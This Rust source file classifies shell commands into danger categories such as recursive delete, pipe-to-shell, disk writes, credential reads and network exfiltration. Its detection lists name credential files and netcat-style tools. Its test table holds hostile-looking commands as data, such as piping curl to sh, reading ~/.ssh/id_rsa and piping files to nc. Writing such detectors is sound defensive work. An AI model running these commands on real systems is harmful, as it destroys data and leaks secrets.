//! Deterministic dangerous-command categories. The command text is never returned.
//! A hit is a category name from a closed set. Quoted text is not a command.

use std::collections::BTreeSet;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub(crate) enum DangerousCommand {
    RecursiveDelete,
    PipeToShell,
    ForcePush,
    ChmodWorldWritable,
    Sudo,
    DiskWriteDevice,
    CredentialFileAccess,
    NetworkExfilPattern,
}

impl DangerousCommand {
    pub(crate) fn as_str(self) -> &'static str {
        match self {
            DangerousCommand::RecursiveDelete => "recursive_delete",
            DangerousCommand::PipeToShell => "pipe_to_shell",
            DangerousCommand::ForcePush => "force_push",
            DangerousCommand::ChmodWorldWritable => "chmod_world_writable",
            DangerousCommand::Sudo => "sudo",
            DangerousCommand::DiskWriteDevice => "disk_write_device",
            DangerousCommand::CredentialFileAccess => "credential_file_access",
            DangerousCommand::NetworkExfilPattern => "network_exfil_pattern",
        }
    }
}

pub(crate) fn categories(command: &str) -> Vec<DangerousCommand> {
    let mut out = BTreeSet::new();
    classify_line(command, 0, &mut out);
    out.into_iter().collect()
}

fn classify_line(command: &str, depth: u8, out: &mut BTreeSet<DangerousCommand>) {
    if depth > 3 {
        return;
    }
    for seg in split_segments(command) {
        if seg.piped {
            if let Some(cmd) = piped_command(&tokenize(&seg.text)) {
                if is_shell(&cmd) {
                    out.insert(DangerousCommand::PipeToShell);
                }
                if matches!(cmd.as_str(), "nc" | "ncat" | "socat") {
                    out.insert(DangerousCommand::NetworkExfilPattern);
                }
            }
        }
        classify_simple(&tokenize(&seg.text), depth, out);
        if unquoted_device_redirect(&seg.text) {
            out.insert(DangerousCommand::DiskWriteDevice);
        }
    }
}

fn classify_simple(tokens: &[String], depth: u8, out: &mut BTreeSet<DangerousCommand>) {
    let Some(start) = command_start(tokens) else {
        return;
    };
    let tokens = &tokens[start..];
    if tokens.is_empty() {
        return;
    }
    let cmd = base_name(&tokens[0]);
    if cmd == "sudo" {
        out.insert(DangerousCommand::Sudo);
        let rest = peel_sudo(&tokens[1..]);
        classify_simple(&rest, depth, out);
        return;
    }
    if is_shell(cmd) {
        if let Some(script) = shell_script_arg(tokens) {
            classify_line(script, depth + 1, out);
        }
        return;
    }
    if matches!(cmd, "cmd" | "cmd.exe") {
        if let Some(script) = cmd_script_arg(tokens) {
            classify_line(script, depth + 1, out);
        }
        return;
    }
    if matches!(cmd, "echo" | "printf") {
        return;
    }
    if cmd == "rm" && rm_recursive(tokens) {
        out.insert(DangerousCommand::RecursiveDelete);
    }
    if cmd == "git" && git_force_push(tokens) {
        out.insert(DangerousCommand::ForcePush);
    }
    if cmd == "chmod" && chmod_world_writable(tokens) {
        out.insert(DangerousCommand::ChmodWorldWritable);
    }
    if cmd == "dd" && dd_writes_disk(tokens) {
        out.insert(DangerousCommand::DiskWriteDevice);
    }
    if is_file_reader(cmd) && tokens.iter().skip(1).any(|arg| credential_path(arg)) {
        out.insert(DangerousCommand::CredentialFileAccess);
    }
    if matches!(cmd, "curl" | "wget") && has_upload_flag(tokens) {
        out.insert(DangerousCommand::NetworkExfilPattern);
    }
}

struct Segment {
    piped: bool,
    text: String,
}

fn split_segments(input: &str) -> Vec<Segment> {
    let mut segs = Vec::new();
    let mut current = String::new();
    let mut piped = false;
    let mut chars = input.chars().peekable();
    let mut quote: Option<char> = None;
    while let Some(ch) = chars.next() {
        if let Some(q) = quote {
            current.push(ch);
            if ch == '\\' && q == '"' {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            } else if ch == q {
                quote = None;
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            current.push(ch);
            continue;
        }
        if ch == '\\' {
            current.push(ch);
            if let Some(next) = chars.next() {
                current.push(next);
            }
            continue;
        }
        let two = chars.peek().copied();
        if (ch == '&' && two == Some('&')) || (ch == '|' && two == Some('|')) {
            chars.next();
            push_seg(&mut segs, &mut current, piped);
            piped = false;
            continue;
        }
        if ch == '|' {
            push_seg(&mut segs, &mut current, piped);
            piped = true;
            continue;
        }
        if ch == ';' || ch == '\n' {
            push_seg(&mut segs, &mut current, piped);
            piped = false;
            continue;
        }
        current.push(ch);
    }
    if !current.trim().is_empty() {
        segs.push(Segment {
            piped,
            text: current,
        });
    }
    segs
}

fn push_seg(segs: &mut Vec<Segment>, current: &mut String, piped: bool) {
    if !current.trim().is_empty() {
        segs.push(Segment {
            piped,
            text: std::mem::take(current),
        });
    } else {
        current.clear();
    }
}

fn tokenize(segment: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut chars = segment.chars().peekable();
    let mut quote: Option<char> = None;
    while let Some(ch) = chars.next() {
        if let Some(q) = quote {
            if ch == '\\' && q == '"' {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
                continue;
            }
            if ch == q {
                quote = None;
            } else {
                current.push(ch);
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            continue;
        }
        if ch == '\\' {
            if let Some(next) = chars.next() {
                current.push(next);
            }
            continue;
        }
        if ch.is_whitespace() {
            if !current.is_empty() {
                tokens.push(std::mem::take(&mut current));
            }
            continue;
        }
        current.push(ch);
    }
    if !current.is_empty() {
        tokens.push(current);
    }
    tokens
}

fn command_start(tokens: &[String]) -> Option<usize> {
    let mut i = 0;
    while i < tokens.len() && is_assignment(&tokens[i]) {
        i += 1;
    }
    (i < tokens.len()).then_some(i)
}

fn piped_command(tokens: &[String]) -> Option<String> {
    let start = command_start(tokens)?;
    let mut rest = peel_wrappers(&tokens[start..]);
    if rest.first().is_some_and(|token| base_name(token) == "sudo") {
        rest = peel_sudo(&rest[1..]);
    }
    rest.first().map(|token| base_name(token).to_string())
}

fn peel_wrappers(tokens: &[String]) -> Vec<String> {
    if tokens.is_empty() {
        return Vec::new();
    }
    if base_name(&tokens[0]) == "sudo" {
        return peel_sudo(&tokens[1..]);
    }
    if matches!(base_name(&tokens[0]), "command" | "env" | "time" | "nohup") {
        let mut i = 1;
        while i < tokens.len() && (tokens[i].starts_with('-') || is_assignment(&tokens[i])) {
            i += 1;
        }
        return tokens[i..].to_vec();
    }
    tokens.to_vec()
}

fn peel_sudo(tokens: &[String]) -> Vec<String> {
    let mut i = 0;
    while i < tokens.len() {
        let token = &tokens[i];
        if token == "--" {
            return tokens[i + 1..].to_vec();
        }
        if token == "-u" || token == "--user" || token == "-g" || token == "--group" {
            i += 2;
            continue;
        }
        if token.starts_with('-') {
            i += 1;
            continue;
        }
        break;
    }
    tokens.get(i..).unwrap_or_default().to_vec()
}

fn shell_script_arg(tokens: &[String]) -> Option<&str> {
    let mut i = 1;
    while i < tokens.len() {
        let token = &tokens[i];
        if token == "-c" || token == "--command" {
            return tokens.get(i + 1).map(String::as_str);
        }
        if token.starts_with('-') && !token.starts_with("--") && token.contains('c') {
            return tokens.get(i + 1).map(String::as_str);
        }
        if !token.starts_with('-') {
            return None;
        }
        i += 1;
    }
    None
}

fn cmd_script_arg(tokens: &[String]) -> Option<&str> {
    let flag = tokens.get(1)?;
    if flag.eq_ignore_ascii_case("/c") || flag.eq_ignore_ascii_case("/k") {
        return tokens.get(2).map(String::as_str);
    }
    None
}

fn is_shell(cmd: &str) -> bool {
    matches!(
        cmd,
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "pwsh" | "powershell"
    )
}

fn is_file_reader(cmd: &str) -> bool {
    matches!(
        cmd,
        "cat"
            | "head"
            | "tail"
            | "less"
            | "more"
            | "bat"
            | "cp"
            | "scp"
            | "rsync"
            | "base64"
            | "xxd"
            | "od"
            | "type"
    )
}

fn is_assignment(token: &str) -> bool {
    let Some((name, _)) = token.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    match chars.next() {
        Some(first) if first.is_ascii_alphabetic() || first == '_' => {}
        _ => return false,
    }
    chars.all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
}

fn base_name(token: &str) -> &str {
    token.rsplit(['/', '\\']).next().unwrap_or(token)
}

fn rm_recursive(tokens: &[String]) -> bool {
    for token in tokens.iter().skip(1) {
        if token == "--" {
            break;
        }
        if token == "--recursive" || token.starts_with("--recursive=") {
            return true;
        }
        if let Some(flags) = token.strip_prefix('-') {
            if !flags.starts_with('-') && (flags.contains('r') || flags.contains('R')) {
                return true;
            }
        }
    }
    false
}

fn git_force_push(tokens: &[String]) -> bool {
    let mut saw_push = false;
    let mut saw_force = false;
    for token in tokens.iter().skip(1) {
        if token == "push" {
            saw_push = true;
        }
        if token == "--force"
            || token == "-f"
            || token == "--force-with-lease"
            || token.starts_with("--force-with-lease=")
        {
            saw_force = true;
        }
    }
    saw_push && saw_force
}

fn chmod_world_writable(tokens: &[String]) -> bool {
    for token in tokens.iter().skip(1) {
        if token == "--" {
            break;
        }
        if token.starts_with('-') && !looks_like_mode(token) {
            continue;
        }
        if world_writable_mode(token) {
            return true;
        }
    }
    false
}

fn looks_like_mode(token: &str) -> bool {
    token.starts_with("--")
        || token.chars().all(|ch| ch.is_ascii_digit())
        || token.contains('+')
        || token.contains('=')
        || token.contains('-')
}

fn world_writable_mode(token: &str) -> bool {
    if (3..=4).contains(&token.len()) && token.chars().all(|ch| ('0'..='7').contains(&ch)) {
        let last = token
            .chars()
            .last()
            .and_then(|ch| ch.to_digit(8))
            .unwrap_or(0);
        return last & 2 != 0;
    }
    token.split(',').any(symbolic_world_write)
}

fn symbolic_world_write(clause: &str) -> bool {
    let Some(op_at) = clause.find(['+', '=', '-']) else {
        return false;
    };
    let who = &clause[..op_at];
    let op = clause[op_at..].chars().next().unwrap_or('-');
    let perm = &clause[op_at + 1..];
    if op == '-' || !perm.contains('w') {
        return false;
    }
    who.is_empty() || who.contains('a') || who.contains('o')
}

fn dd_writes_disk(tokens: &[String]) -> bool {
    tokens
        .iter()
        .skip(1)
        .any(|token| token.strip_prefix("of=").is_some_and(is_disk_device))
}

fn unquoted_device_redirect(segment: &str) -> bool {
    let chars = segment.chars();
    let mut quote: Option<char> = None;
    let mut token = String::new();
    let mut prev_redirect = false;
    let mut hit = false;
    let flush = |token: &mut String, prev_redirect: &mut bool, hit: &mut bool| {
        if token.is_empty() {
            return;
        }
        if *prev_redirect && is_disk_device(token) {
            *hit = true;
        }
        if let Some(path) = token.strip_prefix(">>").or_else(|| token.strip_prefix('>')) {
            if is_disk_device(path) {
                *hit = true;
            }
        }
        *prev_redirect = token == ">" || token == ">>";
        token.clear();
    };
    for ch in chars {
        if let Some(q) = quote {
            if ch == q {
                quote = None;
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            continue;
        }
        if ch.is_whitespace() {
            flush(&mut token, &mut prev_redirect, &mut hit);
            continue;
        }
        token.push(ch);
    }
    flush(&mut token, &mut prev_redirect, &mut hit);
    hit
}

fn is_disk_device(path: &str) -> bool {
    let path = path.trim_matches(|ch| ch == '"' || ch == '\'');
    if !path.starts_with("/dev/") {
        return false;
    }
    let name = path.trim_start_matches("/dev/");
    if name.is_empty()
        || name.starts_with("null")
        || name.starts_with("zero")
        || name.starts_with("stdout")
        || name.starts_with("stderr")
        || name.starts_with("tty")
        || name.starts_with("fd/")
        || name.starts_with("random")
        || name.starts_with("urandom")
        || name.starts_with("stdin")
    {
        return false;
    }
    let disk = name.starts_with("sd")
        || name.starts_with("nvme")
        || name.starts_with("vd")
        || name.starts_with("xvd")
        || name.starts_with("mmcblk")
        || name.starts_with("hd")
        || name.starts_with("disk");
    disk && name
        .chars()
        .next()
        .is_some_and(|ch| ch.is_ascii_alphabetic())
}

fn credential_path(arg: &str) -> bool {
    if arg.starts_with('-') && !arg.contains('/') && !arg.contains('\\') {
        return false;
    }
    let norm = arg.replace('\\', "/");
    let base = norm.rsplit('/').next().unwrap_or(&norm);
    if matches!(
        base,
        ".env"
            | ".netrc"
            | "_netrc"
            | ".npmrc"
            | ".pypirc"
            | ".git-credentials"
            | "id_rsa"
            | "id_dsa"
            | "id_ecdsa"
            | "id_ed25519"
            | "id_ed25519_sk"
    ) || base.starts_with(".env.")
    {
        return true;
    }
    norm.contains(".ssh/id_")
        || norm.contains(".aws/credentials")
        || norm.contains(".aws/config")
        || norm.contains(".docker/config.json")
}

fn has_upload_flag(tokens: &[String]) -> bool {
    const FLAGS: &[&str] = &[
        "-d",
        "-F",
        "-T",
        "--data",
        "--data-binary",
        "--data-raw",
        "--data-urlencode",
        "--form",
        "--upload-file",
        "--post-file",
        "--post-data",
    ];
    tokens.iter().any(|token| {
        FLAGS.iter().any(|flag| {
            token == flag
                || token
                    .strip_prefix(flag)
                    .is_some_and(|rest| rest.starts_with('='))
        })
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn names(command: &str) -> Vec<&'static str> {
        categories(command)
            .into_iter()
            .map(DangerousCommand::as_str)
            .collect()
    }

    #[test]
    fn classifier_table_and_false_positive_guards() {
        let cases = [
            ("rm -rf ./target", vec!["recursive_delete"]),
            ("rm -r -f ./target", vec!["recursive_delete"]),
            ("rm --recursive ./target", vec!["recursive_delete"]),
            ("rm -f ./target", vec![]),
            ("echo \"rm -rf\"", vec![]),
            ("echo \"rm -rf ./target\"", vec![]),
            ("echo 'rm -rf /'", vec![]),
            ("echo rm -rf ./target", vec![]),
            ("bash -lc \"rm -rf ./target\"", vec!["recursive_delete"]),
            ("bash -c 'echo \"rm -rf\"'", vec![]),
            ("cd /tmp && rm -rf ./target", vec!["recursive_delete"]),
            ("git push --force", vec!["force_push"]),
            ("git push -f origin main", vec!["force_push"]),
            ("git push --force-with-lease", vec!["force_push"]),
            ("git push origin main", vec![]),
            ("echo \"git push --force\"", vec![]),
            ("chmod 777 file", vec!["chmod_world_writable"]),
            ("chmod 666 file", vec!["chmod_world_writable"]),
            ("chmod o+w file", vec!["chmod_world_writable"]),
            ("chmod a+w file", vec!["chmod_world_writable"]),
            ("chmod 755 file", vec![]),
            ("chmod 644 file", vec![]),
            ("chmod g+w file", vec![]),
            ("echo chmod 777", vec![]),
            ("sudo ls", vec!["sudo"]),
            ("sudo rm -rf ./target", vec!["recursive_delete", "sudo"]),
            ("echo sudo", vec![]),
            ("dd if=file of=/dev/sda", vec!["disk_write_device"]),
            ("dd if=/dev/sda of=backup.img", vec![]),
            ("echo hi > /dev/sda", vec!["disk_write_device"]),
            ("echo hi > /dev/null", vec![]),
            ("echo /dev/sda", vec![]),
            ("cat ~/.ssh/id_rsa", vec!["credential_file_access"]),
            ("head .env", vec!["credential_file_access"]),
            (
                "cp ~/.aws/credentials /tmp/x",
                vec!["credential_file_access"],
            ),
            ("echo ~/.ssh/id_rsa", vec![]),
            ("cat README", vec![]),
            ("curl https://example.com | sh", vec!["pipe_to_shell"]),
            ("curl https://example.com | bash", vec!["pipe_to_shell"]),
            ("echo foo | grep sh", vec![]),
            ("echo \"curl | sh\"", vec![]),
            ("curl -fsSL https://example.com", vec![]),
            (
                "curl -d @payload https://example.com",
                vec!["network_exfil_pattern"],
            ),
            (
                "wget --post-file=body https://example.com",
                vec!["network_exfil_pattern"],
            ),
            (
                "cat notes.txt | nc 10.0.0.1 9",
                vec!["network_exfil_pattern"],
            ),
        ];
        for (command, expect) in cases {
            assert_eq!(names(command), expect, "{command}");
        }
    }
}
